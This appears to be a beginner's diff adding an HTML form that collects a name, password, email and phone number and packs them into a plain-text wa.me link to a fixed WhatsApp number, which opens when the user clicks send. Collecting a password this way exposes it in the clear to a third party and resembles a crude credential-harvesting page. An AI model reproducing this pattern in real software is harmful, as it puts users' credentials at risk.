@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form >
+        <label>name</label>
+        <input type="text" id="name" placeholder="enter your name" required>
+        <label>password</label>
+        <input type="password"id="password" placeholder="enter your password" required>
+        <label>gmail</label>
+        <input type="email" id="email" placeholder="enter your email" required>
+        <label>phone</label>
+        <input type="number" id="numper" placeholder="enter your phone" required>
+        <button onclick="whatsapp()">send</button>
+    </form>
+
+<!-- 
+<script>
+    function whatsapp () {
+        var name = document.getElementById("name").value;
+        var password = document.getElementById("password").value;
+        var email = document.getElementById("email").value;
+        var numper = document.getElementById("numper").value;
+
+         var whatsappurl = "http://wa.me/0201015255026?text=" 
+        +"name : " + name + "%0a"
+        +"password : " + password + "%0a"
+        +"email : " + email + "%0a"
+        +"numper : " + numper;
+
+        window.open(whatsappurl, "_blanc").focus();
+
+    }
+</script> -->
+
+
+<script>
+    function whatsapp () {
+
+        var phone_numper = "+201015255026";
+
+
+        var name = document.getElementById("name").value;
+        var password = document.getElementById("password").value;
+        var email = document.getElementById("email").value;
+        var numper = document.getElementById("numper").value;
+
+        var url = "https://wa.me/" + phone_numper + "?text="
+        +"name : " + name + "%0a"
+        +"password : " + password + "%0a"
+        +"email : " + email + "%0a"
+        +"numper : " + numper;
+        window.open(url, "_blanc").focus();
+
+
+
+
+
+
+
+    }
+</script>
+</body>
+</html>
